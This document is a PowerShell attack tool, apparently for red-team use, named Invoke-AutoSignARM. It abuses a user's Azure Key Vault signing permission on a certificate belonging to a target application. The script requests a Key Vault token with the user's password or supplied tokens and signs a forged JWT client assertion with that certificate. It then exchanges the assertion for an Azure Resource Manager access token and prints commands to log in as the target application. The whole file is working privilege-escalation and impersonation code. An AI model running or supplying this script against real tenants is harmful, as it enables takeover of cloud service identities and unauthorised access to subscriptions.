# Main function
function Invoke-AutoSignARM {
    param(
    [Parameter(Mandatory=$true)]
    [string]$TenantId,

    [Parameter(Mandatory=$true)]
    [string]$TargetID,

    [Parameter(Mandatory=$true)]
    [string]$keyVault,
    
    [Parameter(Mandatory=$true)]
    [string]$CertName,

    [Parameter(Mandatory=$true)]
    [string]$Username,

    [Parameter(Mandatory=$false)]
    [string]$Password,

    [Parameter(Mandatory=$false)]
    [switch]$IsSigningPermissions,

    [Parameter(Mandatory=$false)]
    [switch]$UseTokens
    )


    Write-Output "`n`n    #### AutoSignARM ####`n`n"
    Write-Output "[+] Tenant     : $TenantId"
    Write-Output "[+] Target     : $TargetID"
    Write-Output "[+] Abused Cert: $CertName"
    Write-Output "[+] Run As     : $Username"
    
    if (($Password -and $UseTokens )-or $Password)
    {
        $AuthMethod = "Password"
        Write-Output "[+] Auth Method: $AuthMethod`n`n"
    }
    elseif ($UseTokens){
        $AuthMethod = "Tokens"
        Write-Output "[+] Auth Method: $AuthMethod`n`n"
    }
    else
    {
        Write-Host -BackgroundColor Red "[!] Must use -Password or -UseTokens."
        exit
    }

 
    try{
    ### Function 0 - verify permissions
    if ($IsSigningPermissions){
        Write-Host "==== Step 0: Checking for Signing Permissions ===="
        
        if ( $AuthMethod -eq "Password"){
        Write-Host -ForegroundColor DarkRed "password"
        
        $IdP = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
        $RequestParams = @{
            client_id     = 'd3590ed6-52b3-4102-aeff-aad2292ab01c' # Microsoft Office clientID
            scope         = 'https://management.azure.com/.default'
            username      = $Username
            password      = $Password
            grant_type    = "password"
            }
        $ARMResponse = Invoke-RestMethod -Uri $IdP -Method POST -ContentType "application/x-www-form-urlencoded" -Body $RequestParams
        $ARMAccessToken = $($ARMResponse.access_token)
        }

        if ($AuthMethod -eq "Tokens"){
            $ARMAccessToken = Read-Host "[?] Enter ARM access token"
        }

        


        $URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
        $RequestParams = @{
         Method = 'GET'
         Uri = $URI
         Headers = @{
         'Authorization' = "Bearer $ARMAccessToken"
         }
        }
        $subscriptionID = $((Invoke-RestMethod @RequestParams).value).id
        
        
        $URI2 = "https://management.azure.com$($subscriptionID)/resources?api-version=2020-10-01"
        $RequestParams = @{
         Method = 'GET'
         Uri = $URI2
         Headers = @{
         'Authorization' = "Bearer $($ARMAccessToken)"
         }
        }
        $vaultID = $((Invoke-RestMethod @RequestParams).value).id
        
        $URI3 = "https://management.azure.com$vaultID/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
        $RequestParams = @{
         Method = 'GET'
         Uri = $URI3
         Headers = @{
         'Authorization' = "Bearer $($ARMAccessToken)"
         }
        }
        $permissions = (Invoke-RestMethod @RequestParams).value
        
        if ($($permissions.dataActions -match 'vaults/keys/sign/action')){
            Write-Host -ForegroundColor Green "[+] $Username has signing permissions"
            Write-Host "Starting attack...`n`n"
        }
        else{
            Write-Host -BackgroundColor Red "[!] $Username lacks signing permissions"    
            Exit
        }
    }

    
    ### Function 1 - Get KV access token
    $keyVaultTokenUrl = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"
    
    Write-Host "==== Step 1: Request access token for key vault ===="
    Write-Host "[+] IdP      : $keyVaultTokenUrl"
    Write-Host "[+] client_id: Microsoft Office clientID"
    Write-Host "[+] scope    : https://vault.azure.net/.default"

    if ( $AuthMethod -eq "Password"){    
        $RequestParams = @{
        client_id     = 'd3590ed6-52b3-4102-aeff-aad2292ab01c' # Microsoft Office clientID
        scope         = 'https://vault.azure.net/.default'
        username      = $Username
        password      = $Password
        grant_type    = "password"
        }
        $keyVaultTokenResponse = Invoke-RestMethod -Uri $keyVaultTokenUrl -Method POST -ContentType "application/x-www-form-urlencoded" -Body $RequestParams
        $keyVaultAccessToken = $keyVaultTokenResponse.access_token
       }
    
    if ($AuthMethod -eq "Tokens"){
            $keyVaultAccessToken = Read-Host "[?] Enter keyVault access token"
        }
    

    Write-Host -ForegroundColor Green "[+] Got Key Vault AccessToken`n`n"
    
    ### Function 2 - Get-Cert details
    Write-Host "==== Step 2: Getting certificate details ===="
    Write-Host "[+] Key Vault: $($keyVault)"
    Write-Host "[+] Cert Name: $($CertName)"
    
        
    $uri = "https://$keyVault.vault.azure.net/certificates?api-version=7.3"
    $httpResponse = Invoke-WebRequest -Uri $uri -Headers @{ 'Authorization' = "Bearer $($keyVaultAccessToken)" }
    $certs    = $httpResponse.Content | ConvertFrom-Json
    $certUri  = $certs.Value | where {$_.id -like "*$($CertName)*"}

    #Write-Output $certUri
    $httpResponse = Invoke-WebRequest -Uri "$($certUri.id)?api-version=7.3" -Headers @{ 'Authorization' = "Bearer $($keyVaultAccessToken)" }
    $AKVCertificate = $httpResponse.Content | ConvertFrom-Json
 
    Write-Host "[+] Cert Hash: $($AKVCertificate.x5t)"
    
    Write-Host -ForegroundColor Green "[+] Exported all certificate details`n`n"

    
    ### Function 3 - SignJWT
    $TargetAppID = $TargetID
    $audience = "https://login.microsoftonline.com/$TenantId/oauth2/token"

    Write-Host "==== Step 3 SigningJWT ===="
    Write-Host "[+] Target ID: $($TargetAppID)"
    Write-Host "[+] Audience : $($audience)"
    
    # JWT request should be valid for max 2 minutes.
    $StartDate             = (Get-Date "1970-01-01T00:00:00Z" ).ToUniversalTime()
    $JWTExpirationTimeSpan = (New-TimeSpan -Start $StartDate -End (Get-Date).ToUniversalTime().AddMinutes(2)).TotalSeconds
    $JWTExpiration         = [math]::Round($JWTExpirationTimeSpan,0)
    
    # Create a NotBefore timestamp.
    $NotBeforeExpirationTimeSpan = (New-TimeSpan -Start $StartDate -End ((Get-Date).ToUniversalTime())).TotalSeconds
    $NotBefore                   = [math]::Round($NotBeforeExpirationTimeSpan,0)
    
    # Create a JWT header
    $jwtHeader = @{
        'alg'  = "RS256"              # Use RSA encryption and SHA256 as hashing algorithm
        'typ'  = "JWT"                # We want a JWT
        'x5t'  = $AKVCertificate.x5t  # The pubkey hash we received from Azure Key Vault
    }
    
    # Create the payload
    $jwtPayLoad = @{
        'aud'   = $audience           # Points to oauth token request endpoint for your tenant
        'exp'   = $JWTExpiration      # Expiration of JWT request
        'iss'   = $TargetAppID    # The AppID for which we request a token for
        'jti'   = [guid]::NewGuid()   # Random GUID
        'nbf'   = $NotBefore          # This should not be used before this timestamp
        'sub'   = $TargetAppID    # Subject
    }
    
    # Convert header and payload to JSON and to base64
    $jwtHeaderBytes  = [System.Text.Encoding]::UTF8.GetBytes(($jwtHeader | ConvertTo-Json))
    $jwtPayloadBytes = [System.Text.Encoding]::UTF8.GetBytes(($jwtPayLoad | ConvertTo-Json))
    $b64JwtHeader    = [System.Convert]::ToBase64String($jwtHeaderBytes)
    $b64JwtPayload   = [System.Convert]::ToBase64String($jwtPayloadBytes)
    
    # Concat header and payload to create an unsigned JWT and compute a Sha256 hash
    $unsignedJwt      = $b64JwtHeader + "." + $b64JwtPayload
    $unsignedJwtBytes = [System.Text.Encoding]::UTF8.GetBytes($unsignedJwt)
    $hasher           = [System.Security.Cryptography.HashAlgorithm]::Create('sha256')
    $jwtSha256Hash    = $hasher.ComputeHash($unsignedJwtBytes)
    $jwtSha256HashB64 = [Convert]::ToBase64String($jwtSha256Hash) -replace '\+','-' -replace '/','_' -replace '='
    
    # Sign the sha256 of the unsigned JWT using the certificate in Azure Key Vault
    $uri      = "$($AKVCertificate.kid)/sign?api-version=7.3"
    $headers  = @{
        'Authorization' = "Bearer $keyVaultAccessToken"
        'Content-Type' = 'application/json'
    }
    $response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body (([ordered] @{
        'alg'   = 'RS256'
        'value' = $jwtSha256HashB64
    }) | ConvertTo-Json)
    $signature = $response.value
    
    # Concat the signature to the unsigned JWT
    $signedJWT = $unsignedJwt + "." + $signature
    Write-Host -ForegroundColor Green "[+] GoT signing token`n`n"

    
    ### Function 4 - Get-ARM
    Write-Host "==== Step 4 Getting ARM Access Token ===="
    Write-Host "[+] IdP      : $keyVaultTokenUrl"
    Write-Host "[+] client_id: $TargetId"
    Write-Host "[+] scope    : https://management.azure.com/.default"

    
    $uri = "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token"   
    $headers = @{'Content-Type' = 'application/x-www-form-urlencoded'}
    $response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body ([ordered]@{
                'client_id'             = $TargetId
                'client_assertion'      = $signedJWT
                'client_assertion_type' = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
                'scope'                 = 'https://management.azure.com/.default'
                'grant_type'            = 'client_credentials'
                })
    $ARMAccessToken = "$($response.access_token)"
    Write-Host -ForegroundColor Green "[+] ARM AccessToken:"; $ARMAccessToken ; "`n`n"


    Write-Host "++++ Next Steps ++++"
    Write-Host -ForegroundColor Yellow "[+] Run the following to connect as $TargetID"
    Write-Host "`$ARMAccessToken = `'$ARMAccessToken`'`n"
    Write-Host "Connect-AzAccount -AccessToken `$ARMAccessToken -AccountId $TargetId -Tenant $TenantID"

    



    }
    catch {
    Write-Host -BackgroundColor Red "[!] An error occurred that could not be resolved."
    }


}
